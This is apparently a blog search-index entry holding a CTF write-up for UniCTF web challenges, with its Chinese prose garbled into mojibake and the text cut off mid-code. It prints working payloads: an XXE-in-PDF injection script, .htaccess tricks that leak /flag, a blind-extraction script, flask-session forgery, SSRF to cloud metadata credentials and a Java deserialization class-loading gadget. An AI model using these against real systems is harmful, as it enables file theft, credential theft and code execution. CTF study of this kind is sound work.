<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>UniCTF Webéƒ¨åˆ†é¢˜è§£</title>
      <link href="/2026/01/31/UniCTF-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
      <url>/2026/01/31/UniCTF-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="UniCTF-Webéƒ¨åˆ†é¢˜è§£"><a href="#UniCTF-Webéƒ¨åˆ†é¢˜è§£" class="headerlink" title="UniCTF Webéƒ¨åˆ†é¢˜è§£"></a>UniCTF Webéƒ¨åˆ†é¢˜è§£</h1><p>å¯’å‡æ‰“çš„å°æ¯”èµ›ï¼Œè™½è¯´æœ‰æ–°ç”Ÿèµ›é“ä½†è¿˜æ˜¯è¢«å…¶ä»–å­¦æ ¡çš„æ–°ï¼ˆå¤§ï¼‰ç”Ÿï¼ˆä½¬ï¼‰è–„çº±äº†ï¼ˆæˆ–è®¸ä¹Ÿè·Ÿæˆ‘ä»¬ä¸€ä¸ªé˜Ÿä¼ä¸‰ä¸ªWebæ‰‹æœ‰å…³ç³»ï¼Ÿ</p><p>Webæ–¹å‘æ”¾äº†12é“é¢˜ï¼Œæˆ‘ä»¬åšäº†7é“ï¼Œè¿™ä¸ªæˆç»©å¯¹äºæˆ‘ä»¬è¿™ç§åˆå‡ºèŒ…åºçš„èœé¸¡ä¹Ÿè¿˜ç®—ä¸é”™ğŸ˜</p><p>è´´ä¸€å¼ æ–°ç”Ÿèµ›é“çš„æ’å</p><p><img src="/img/post/image-20260131100231640.png" alt="image-20260131100231640"></p><p>è¿˜éœ€è¦åŠªåŠ›</p><br/><h2 id="SecureDoc"><a href="#SecureDoc" class="headerlink" title="SecureDoc"></a>SecureDoc</h2><p>é¢˜ç›®è¯´æ˜¯ä¸€ä¸ªPDFçš„è§£æå™¨ï¼Œéšä¾¿ä¼ ä¸€ä¸ªPDFï¼Œå¼¹å‡ºæ¥çš„é¡µé¢æ˜¾ç¤ºæœªåœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°XFA</p><p><img src="/img/post/image-20260130232321391.png" alt="image-20260130232321391"></p><p><strong>XFA</strong>æ˜¯ä¸€ç§åŸºäº <strong>XML</strong> çš„æŠ€æœ¯è§„èŒƒï¼Œä¸»è¦ç”¨äºåœ¨ <strong>PDF æ–‡æ¡£</strong> ä¸­åˆ›å»ºã€æ¸²æŸ“å’Œå¤„ç†å¤æ‚çš„ã€åŠ¨æ€çš„äº¤äº’å¼è¡¨å•ï¼Œæ—¢ç„¶æ˜¯XMLæ ¼å¼çš„æ–‡æœ¬ï¼Œè‡ªç„¶èƒ½æƒ³åˆ°XXEï¼Œè¿™é‡Œä½¿ç”¨è„šæœ¬ä¸ºPDFæ³¨å…¥XFA</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> PyPDF2</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_xfa_to_pdf</span>(<span class="params">input_pdf, output_pdf, xfa_xml</span>):</span><br><span class="line">    <span class="comment"># è¯»å–åŸå§‹PDF</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_pdf, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        reader = PyPDF2.PdfReader(f)</span><br><span class="line">        writer = PyPDF2.PdfWriter()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¤åˆ¶æ‰€æœ‰é¡µé¢</span></span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> reader.pages:</span><br><span class="line">            writer.add_page(page)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># åˆ›å»ºXFAæ•°æ®æµ - æ–°ç‰ˆPyPDF2æ–¹å¼</span></span><br><span class="line">        <span class="keyword">from</span> PyPDF2.generic <span class="keyword">import</span> DecodedStreamObject, NameObject, ArrayObject, DictionaryObject</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ–¹æ³•1: ä½¿ç”¨DecodedStreamObject</span></span><br><span class="line">        xfa_stream = DecodedStreamObject()</span><br><span class="line">        xfa_stream._data = xfa_xml.encode()  <span class="comment"># ç›´æ¥è®¾ç½®_dataå±æ€§</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ–¹æ³•2: æˆ–è€…ä½¿ç”¨encodedå±æ€§</span></span><br><span class="line">        <span class="comment"># xfa_stream.encoded_data = xfa_xml.encode()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ·»åŠ åˆ°writer</span></span><br><span class="line">        xfa_ref = writer._add_object(xfa_stream)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># åˆ›å»ºAcroFormå­—å…¸</span></span><br><span class="line">        acroform = DictionaryObject(&#123;</span><br><span class="line">            NameObject(<span class="string">&#x27;/Fields&#x27;</span>): ArrayObject(),</span><br><span class="line">            NameObject(<span class="string">&#x27;/XFA&#x27;</span>): xfa_ref</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è®¾ç½®Catalog</span></span><br><span class="line">        writer._root_object.update(&#123;</span><br><span class="line">            NameObject(<span class="string">&#x27;/AcroForm&#x27;</span>): acroform</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç¡®ä¿æœ‰Catalogå¯¹è±¡</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;/Catalog&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> writer._root_object:</span><br><span class="line">            catalog = DictionaryObject()</span><br><span class="line">            writer._root_object[NameObject(<span class="string">&#x27;/Catalog&#x27;</span>)] = catalog</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å†™å…¥æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_pdf, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> out_f:</span><br><span class="line">            writer.write(out_f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æµ‹è¯•XFA XML</span></span><br><span class="line">evil_xfa = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE xdp [</span></span><br><span class="line"><span class="string">&lt;!ENTITY xxe SYSTEM &quot;file://flag&quot;&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;xdp:xdp xmlns:xdp=&quot;http://ns.adobe.com/xdp/&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;template&gt;</span></span><br><span class="line"><span class="string">    &lt;subform name=&quot;form1&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;field name=&quot;exploit&quot;&gt;&amp;xxe;&lt;/field&gt;</span></span><br><span class="line"><span class="string">    &lt;/subform&gt;</span></span><br><span class="line"><span class="string">&lt;/template&gt;</span></span><br><span class="line"><span class="string">&lt;/xdp:xdp&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    inject_xfa_to_pdf(<span class="string">&#x27;writeup.pdf&#x27;</span>, <span class="string">&#x27;evil.pdf&#x27;</span>, evil_xfa)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æˆåŠŸåˆ›å»ºæ¶æ„PDF: evil.pdf&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;é”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>å°†æ³¨å…¥åçš„PDFæ–‡ä»¶ä¸Šä¼ ç»™æœåŠ¡å™¨ï¼Œè§£æå‡ºæ¥å°±æ˜¯flag</p><p><img src="/img/post/image-20260130233237281.png" alt="image-20260130233237281"></p><br/><h2 id="ezUpload"><a href="#ezUpload" class="headerlink" title="ezUpload"></a>ezUpload</h2><p>WAFå¦‚ä¸‹</p><p><img src="/img/post/image-20260130233409304.png" alt="image-20260130233409304"></p><p>å¯¹æ–‡ä»¶å¤§å°å¡çš„å¾ˆæ­»ï¼Œè€Œä¸”æƒé™æ§åˆ¶æ¯”è¾ƒä¸¥æ ¼ï¼Œè®¿é—®<code>/upload</code>è·¯ç”±ä¼šæŠ¥<code>Access Denied</code>ã€‚è€ƒè™‘åˆ°æœåŠ¡å™¨æ˜¯Apacheï¼Œå¤šåŠæ˜¯ä¸Šä¼ <code>.htaccess</code>é…ç½®æ–‡ä»¶</p><p>è¯•å‡ºæ¥å¯ä»¥ä½¿ç”¨å“åº”å¤´å›æ˜¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Options +Indexes</span><br><span class="line">DirectoryIndex /test.txt</span><br><span class="line">Header set X-Flag &quot;expr=%&#123;file:/flag&#125;&quot;</span><br></pre></td></tr></table></figure><p><code>Options +Indexes</code>ç”¨äºå¼€æ”¾ç´¢å¼•ï¼Œå…è®¸å®¢æˆ·ç«¯æŸ¥çœ‹ç›®å½•ç»“æ„ï¼Œç”¨äºåº”ä»˜æƒé™æ§åˆ¶</p><p><code>DirectoryIndex /test.txt</code>è®¾ç½®é»˜è®¤ç´¢å¼•ï¼Œç”¨äºåœ¨å®¢æˆ·ç«¯è®¿é—®<code>/upload</code>è·¯ç”±æ—¶å±•ç¤ºçš„é»˜è®¤æ–‡ä»¶ï¼Œè¿™é‡Œ<code>/test.txt</code>æ˜¯ä»ç½‘ç«™çš„è·Ÿç›®å½•ç®—èµ·ï¼Œå¦‚æœæ²¡æœ‰è¯¥æ–‡ä»¶å°±ä¼šå±•ç¤ºç›®å½•ç»“æ„</p><p><code>Header set X-Flag &quot;expr=%{file:/flag}&quot;</code>ç”¨äºè®¾ç½®å“åº”å¤´ï¼Œexprè¡¨è¾¾å¼<code>%{file:/flag}</code>è¡¨ç¤ºå°†&#x2F;flagæ–‡ä»¶å†…å®¹è´´å…¥<code>X-Flag</code>è¿™ä¸ªå“åº”å¤´ä¸­</p><p>ç”±äºæ‰“å¼€æ–‡ä»¶çš„exprè¡¨è¾¾å¼éœ€è¦å¤„ç†æ–‡ä»¶æ—¶æ‰èƒ½è§¦å‘ï¼Œéœ€è¦å‰ä¸¤æ¡å»å¼ºè¿«apacheå¯»æ‰¾æ ¹ç›®å½•ä¸‹çš„test.txtæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å®é™…å­˜ä¸å­˜åœ¨ä¸é‡è¦ï¼Œä¸»è¦æ˜¯è§¦å‘apacheæœåŠ¡å™¨çš„æ–‡ä»¶å¤„ç†æ“ä½œ</p><p>ä¸Šä¼ æˆåŠŸåå†æ¬¡è®¿é—®<code>/upload</code>è·¯ç”±ï¼ŒæŸ¥çœ‹å“åº”å¤´</p><p><img src="/img/post/image-20260125173115056.png" alt="image-20260125173115056"></p><br/><h2 id="ezUpload-Revenge"><a href="#ezUpload-Revenge" class="headerlink" title="ezUpload Revenge!!"></a>ezUpload Revenge!!</h2><p>ä½œä¸ºä¸Šä¸€é¢˜çš„revengeï¼Œæœ¬é¢˜è¿‡æ»¤äº†æ›´å¤šç‰¹æ®Šå­—ç¬¦</p><p><img src="/img/post/image-20260130234751335.png" alt="image-20260130234751335"></p><p>æ­¤å¤–ï¼Œç»è¿‡æµ‹è¯•ï¼Œè¿‡æ»¤äº†ä¸€äº›å…³é”®å­—æ¯”å¦‚<code>expr=</code>ã€<code>env</code>ã€<code>ErrorDocument</code>ã€<code>redirect</code>ç­‰ï¼Œä¹Ÿæœ‰å¯èƒ½ä¸Šä¸€é¢˜ä¹Ÿè¿‡æ»¤äº†ä¸è¿‡æˆ‘æ²¡ç”¨ä¸Š</p><p>è¿™é¢˜å°±å¾ˆæœ‰æ„æ€äº†ï¼Œå¾—ä¾èµ–ç›²æ³¨ï¼Œpayloadä¹Ÿå°±ä¸‰è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond expr &quot;file(&#x27;/flag&#x27;) =~ /^UniCTF&#123;/&quot;</span><br><span class="line">RewriteRule ^readflag /upload/success [R=301,L]</span><br></pre></td></tr></table></figure><p><code>RewriteEngine On</code>ç”¨äºå¼€å¯å¯ç”¨ URL é‡å†™å¼•æ“ï¼Œè¿™å…è®¸æˆ‘ä»¬æ”¹å†™ä¸€äº›é‡å®šå‘çš„è§„åˆ™</p><p><code>RewriteCond expr &quot;file(&#39;/flag&#39;) =~ /^UniCTF{/&quot;</code>è¯¥è¯­å¥å……å½“äº†ä¸€ä¸ªæ¡ä»¶åˆ¤æ–­çš„è§’è‰²ï¼Œ<code>RewriteCond</code>ç”¨äºæ£€æŸ¥ç‰¹å®šæ¡ä»¶æ˜¯å¦æˆç«‹ï¼Œ<code>expr &quot;file(&#39;/flag&#39;)</code>è¡¨ç¤ºè¿™æå–&#x2F;flagæ–‡ä»¶çš„å†…å®¹ï¼Œ<code>=~</code>ä¸ºæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ“ä½œç¬¦ï¼Œè¿™å¥è¯çš„æ„æ€å°±æ˜¯åˆ¤æ–­&#x2F;flagæ–‡ä»¶æ˜¯ä¸æ˜¯ä»¥<code>UniCTF{</code>å¼€å¤´</p><p>ä¸Šé¢çš„æ¡ä»¶å€˜è‹¥æˆç«‹ï¼Œåˆ™ä¼šè§¦å‘<code>RewriteRule ^readflag /upload/success [R=301,L]</code>ï¼Œè¿™è¡¨ç¤ºä¸€ä¸ªé‡å®šå‘è§„åˆ™ï¼Œè®¿é—®<code>/upload/readflag</code>è·¯ç”±ä¼šè¿›è¡Œ301é‡å®šå‘åˆ°<code>/upload/success</code></p><p>é€šè¿‡ä¸Šé¢çš„é€»è¾‘åˆ¤æ–­ï¼Œå½¢æˆäº†ä¸€ä¸ªç±»ä¼¼å¸ƒå°”ç›²æ³¨çš„ç¯å¢ƒï¼Œæ¥ä¸‹æ¥å°±æ˜¯å†™ä¸€ä¸ªç›²æ³¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.proxies = &#123;<span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://80-4abe9029-a761-44c3-9159-406b239dbd79.challenge.ctfplus.cn/&quot;</span></span><br><span class="line">TRIGGER_URL = TARGET_URL + <span class="string">&quot;upload/readflag&quot;</span></span><br><span class="line"></span><br><span class="line">alphabet = string.ascii_letters + string.digits + <span class="string">&quot;_-!&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;UniCTF&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> alphabet:</span><br><span class="line">            test_char = char</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">in</span> <span class="string">&quot;.+*?^$()[]&#123;&#125;|\\&quot;</span>:</span><br><span class="line">                test_char = <span class="string">&quot;\\&quot;</span> + char</span><br><span class="line"></span><br><span class="line">            htaccess = <span class="string">f&quot;&quot;&quot;RewriteEngine On</span></span><br><span class="line"><span class="string">RewriteCond expr &quot;file(&#x27;/flag&#x27;) =~ /^<span class="subst">&#123;flag&#125;</span><span class="subst">&#123;test_char&#125;</span>/&quot;</span></span><br><span class="line"><span class="string">RewriteRule ^readflag /upload/success [R=301,L]&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                session.post(TARGET_URL, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;.htaccess&#x27;</span>, htaccess)&#125;, timeout=<span class="number">10</span>)</span><br><span class="line">                r = session.get(TRIGGER_URL, allow_redirects=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\ræµ‹è¯•ä¸­: <span class="subst">&#123;flag&#125;</span><span class="subst">&#123;char&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> r.status_code == <span class="number">301</span>:</span><br><span class="line">                    flag += char</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] å‘½ä¸­! ç›®å‰ Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">if</span> char == <span class="string">&quot;&#125;&quot;</span>: <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n[!] è¯·æ±‚å‡ºé”™: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">solve()</span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼Œæˆ‘çš„è„šæœ¬åˆ°æœ€åä¸€ä½ä¼šé™·å…¥å¾ªç¯ï¼Œéœ€è¦æš‚åœè„šæœ¬æ‰‹åŠ¨åŠ ä¸ŠèŠ±æ‹¬å·</p><p><img src="/img/post/image-20260127230117115.png" alt="image-20260127230117115"></p><p>å¾—åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UniCTF&#123;sz_5b6502fd-1d30-4362-bc20-36196ea24831&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="CloudDiag"><a href="#CloudDiag" class="headerlink" title="CloudDiag"></a>CloudDiag</h2><p>æ³¨å†Œå®Œæˆåç»™äº†ä¸€ä¸ªCookie</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">session=eyJib290X2lkIjoiMTc2OTU2OTQzMi41MDMzNiIsInVzZXJfaWQiOjJ9.aXmBUg.2a6cpR3mfkCI7V2C3VrzOWmc3mI</span><br></pre></td></tr></table></figure><p>æœäº†ä¸€ä¸‹æ˜¯flask sessionï¼Œè¿˜æœ‰ä¸ªä¸“é—¨è§£ç å®ƒçš„å·¥å…·<code>flask-unsign</code>ï¼Œè§£ç å‡ºæ¥çœ‹åˆ°<code>user_id</code>ä¸º2</p><p><img src="/img/post/image-20260128125201802.png" alt="image-20260128125201802"></p><p>è·ŸJWTä¸€æ ·ï¼Œflask sessionä¹Ÿæœ‰å¯†é’¥è¿›è¡Œç­¾åï¼Œç”¨è¿™ä¸ªå·¥å…·çˆ†ç ´ä¸€ä¸‹</p><p><img src="/img/post/image-20260128125230805.png" alt="image-20260128125230805"></p><p>è·å¾—å¯†é’¥<code>dev-secret</code>ï¼Œæ¨æµ‹<code>user_id</code>ä¸º1æ˜¯ç®¡ç†å‘˜è´¦æˆ·ï¼Œä¾æ­¤æ„å»ºç®¡ç†å‘˜token</p><p><img src="/img/post/image-20260128125312025.png" alt="image-20260128125312025"></p><p>å†æ¬¡ç™»å½•ï¼Œç”¨æˆ·åå˜ä¸ºrootï¼Œtasksé¡µé¢å¤šäº†ä¸€æ¡éšè—è®°å½•<code>Legacy metadata check</code></p><p><img src="/img/post/image-20260128125541049.png" alt="image-20260128125541049"></p><p>æš´éœ²äº†å…ƒæ•°æ®æœåŠ¡åœ°å€<code>http://metadata:1338/</code>ï¼ŒAWSå…ƒæ•°æ®ç«¯ç‚¹<code>/latest/meta-data/iam/security-credentials/</code>ï¼ŒIAMè§’è‰²å<code>clouddiag-instance-role</code></p><p>è®¿é—®<code>http://metadata:1338/latest/meta-data/iam/security-credentials/clouddiag-instance-role</code>è·å–ä¸´æ—¶å‡­è¯</p><p><img src="/img/post/image-20260128125920606.png" alt="image-20260128125920606"></p><p>åˆ†åˆ«å¡«å…¥<code>/explorer</code>çš„è¡¨å•ä¸­ï¼Œçœ‹åˆ°äº†Buketsï¼Œå»è·å–<code>clouddiag-secrets</code></p><p><img src="/img/post/image-20260128130055909.png" alt="image-20260128130055909"></p><p>æœ‰flagæ–‡ä»¶ï¼ŒPrefixå¡«<code>flags/runtime/</code>ï¼ŒObject Keyå¡«<code>flag-a721f6e652364e498d102955c66b4efe.txt</code></p><p><img src="/img/post/image-20260128130044221.png" alt="image-20260128130044221"></p><p>è·å–flag</p><p><img src="/img/post/image-20260128130233596.png" alt="image-20260128130233596"></p><br/><h2 id="ez-Java"><a href="#ez-Java" class="headerlink" title="ez Java"></a>ez Java</h2><p>é¢˜ç›®ç»™äº†æºç ï¼Œæœ‰ç”¨çš„ç±»æ˜¯<code>ConfigDataWrapper</code>ï¼Œè¯¥ç±»çš„<code>toString()</code>æ–¹æ³•é‡Œé¢æœ‰åŠ¨æ€ç±»åŠ è½½çš„é€»è¾‘ï¼Œæœ‰ä¸ªå‰ææ˜¯<code>sign</code>å­—æ®µçš„å€¼ä¸ºå­—ç¬¦ä¸²<code>ready</code>æ‰èƒ½è§¦å‘</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        result.append(<span class="string">&quot;ConfigDataWrapper[&quot;</span>).append(<span class="string">&quot;ID=&quot;</span>).append(<span class="built_in">this</span>.configId == <span class="literal">null</span> ? <span class="string">&quot;DEFAULT&quot;</span> : <span class="built_in">this</span>.configId).append(<span class="string">&quot;, MetaSize=&quot;</span>).append(<span class="built_in">this</span>.metadata == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.metadata.size()).append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="comment">//è¦æ±‚`sign`å­—æ®µçš„å€¼ä¸º`ready`</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.ClassByte != <span class="literal">null</span> &amp;&amp; <span class="string">&quot;ready&quot;</span>.equals(<span class="built_in">this</span>.sign)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">byte</span>[] decrypted = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="built_in">this</span>.ClassByte.length];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.ClassByte.length; ++i) &#123;</span><br><span class="line">                    decrypted[i] = (<span class="type">byte</span>)(<span class="built_in">this</span>.ClassByte[i] ^ <span class="number">255</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> <span class="string">&quot;646566696e65436c617373&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; hex.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">                    sb.append((<span class="type">char</span>)Integer.parseInt(hex.substring(i, i + <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(sb.toString(), String.class, <span class="type">byte</span>[].class, Integer.TYPE, Integer.TYPE);</span><br><span class="line">                m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                Class&lt;?&gt; clazz = (Class)m.invoke(loader, <span class="literal">null</span>, decrypted, <span class="number">0</span>, decrypted.length);</span><br><span class="line">                clazz.getConstructor().newInstance();</span><br><span class="line">                <span class="keyword">return</span> result.append(<span class="string">&quot; [Verified Context Loaded]&quot;</span>).toString();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">                <span class="keyword">return</span> result.append(<span class="string">&quot; [Verification Failed]&quot;</span>).toString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> result.append(<span class="string">&quot; [Status: STANDBY]&quot;</span>).toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>sb</code>æœ€åå…¶å®å°±æ˜¯<code>defieClass</code></p><p><img src="/img/post/image-20260131000616200.png" alt="image-20260131000616200"></p><p><code>readObject()</code>æ–¹æ³•åœ¨<code>UserProfileController</code>ç±»ä¸‹ï¼Œ<code>/api/user/settings/import</code>è·¯ç”±æ¥æ”¶ä¸€ä¸ª<code>configData</code>å‚æ•°ï¼Œå†…å®¹å¯ä»¥æ˜¯Base64å­—ç¬¦</p><p>åˆæœ‰ä¸ªæ¡ä»¶ï¼Œå¯¹è¾“å…¥æµè¯»å–å­—ç¬¦ä¸²éœ€è¦å†…å®¹ä¸º<code>InternalManager</code>ï¼Œè¯»å–æ•´å‹éœ€è¦å€¼ä¸º<code>2025</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/api/user&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProfileController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(UserProfileController.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/settings/import&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">importSettings</span><span class="params">(<span class="meta">@RequestParam(name = &quot;configData&quot;)</span> String configData)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] rawData = Tools.base64Decode(configData);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(rawData));</span><br><span class="line">            <span class="type">String</span> <span class="variable">identity</span> <span class="operator">=</span> ois.readUTF();</span><br><span class="line">            <span class="type">int</span> <span class="variable">version</span> <span class="operator">=</span> ois.readInt();</span><br><span class="line">            <span class="comment">//åˆä¸€ä¸ªåˆ¤æ–­æ¡ä»¶</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;InternalManager&quot;</span>.equals(identity) &amp;&amp; version == <span class="number">2025</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">                logger.info(<span class="string">&quot;Config Sync Status: Object [&#123;&#125;] has been integrated into system context.&quot;</span>, obj);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;SUCCESS: Configuration synchronized at internal level.&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;FAILED: Identity verification failed.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ERROR: Malformed configuration stream.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§è‡´çš„æ–¹æ³•æ¢³ç†å®Œäº†ï¼Œç°åœ¨çŸ¥é“æ ¸å¿ƒæ˜¯è§¦å‘<code>ConfigDataWrapper.toString()</code>åŠ è½½æ¶æ„ç±»ï¼Œé‚£å°±éœ€è¦åœ¨ååºåˆ—åŒ–æ—¶èƒ½å¤Ÿè‡ªåŠ¨è§¦å‘åˆ°å®ƒã€‚å…¶å®å¯ä»¥æƒ³åˆ°CC5ä¸­çš„å…¥å£<code>BadAttributeValueExpException.readObject()</code>è°ƒç”¨äº†å…¶<code>val</code>å­—æ®µçš„<code>toString()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span 